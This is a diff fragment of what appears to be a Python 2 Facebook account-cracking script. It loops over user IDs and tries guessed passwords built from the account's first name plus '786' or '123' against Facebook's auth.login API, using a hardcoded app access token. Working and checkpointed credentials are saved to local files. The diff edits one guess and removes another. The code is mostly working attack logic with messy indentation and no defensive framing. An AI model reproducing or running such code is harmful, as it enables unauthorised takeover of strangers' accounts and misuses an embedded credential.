@@ -4927,7 +4927,7 @@ def action():
  					                        cps.close()
  					                        cpb.append(c+user+pass4)
 							else:
- 				  				pass5= y['first_name'] + "786"
+ 				  				pass5= b['first_name'] + "786"
  							        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				 				q = json.load(data)
  				  				if 'access_token' in q:
@@ -4943,23 +4943,7 @@ def action():
  					     				   cps.write(k+c+user+'-•◈•-'+pass5+'\n')
  					     				   cps.close()
  					      				   cpb.append(c+user+pass5)
-								   else:
- 				  				           pass6= b['first_name'] + "123"
- 							                   data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
- 				 				           q = json.load(data)
- 				  				           if 'access_token' in q:
- 				      				               print '\033[1;31m[OK]  ' + k + c + user + '  》  ' + pass6+'\n'+"\n"
- 				     				               okb = open('save/successfull.txt', 'a')
- 				     				               okb.write(k+c+user+'-•◈•-'+pass6+'\n')
- 				      				               okb.close()
- 				      				               oks.append(c+user+pass6)
- 				  			                   else:
- 				     				               if 'www.facebook.com' in q['error_msg']:
- 					  				       print '\033[1;96m[CP] ' + k + c + user + '  》  ' + pass6+'\n'
- 					     				       cps = open('save/checkpoint.txt', 'a')
- 					     				       cps.write(k+c+user+'-•◈•-'+pass6+'\n')
- 					     				       cps.close()
- 					      				       cpb.append(c+user+pass6)
+								   
 								   
 																	
 															
